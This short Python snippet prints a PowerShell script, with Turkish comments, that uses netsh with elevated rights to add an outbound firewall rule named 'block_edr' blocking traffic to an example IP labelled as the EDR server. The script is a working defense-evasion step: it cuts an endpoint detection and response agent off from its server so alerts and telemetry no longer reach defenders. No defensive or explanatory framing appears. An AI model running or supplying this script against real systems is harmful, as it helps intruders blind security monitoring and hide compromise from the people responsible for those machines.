x = """


$ip = "198.51.100.45" # EDR sunucu IP’si (örnek IP - değiştirmelisin)
$rule = "block_edr"

Start-Process -FilePath "netsh" -ArgumentList "advfirewall firewall add rule name=$rule dir=out action=block remoteip=$ip" -Verb runAs
"""
print(x)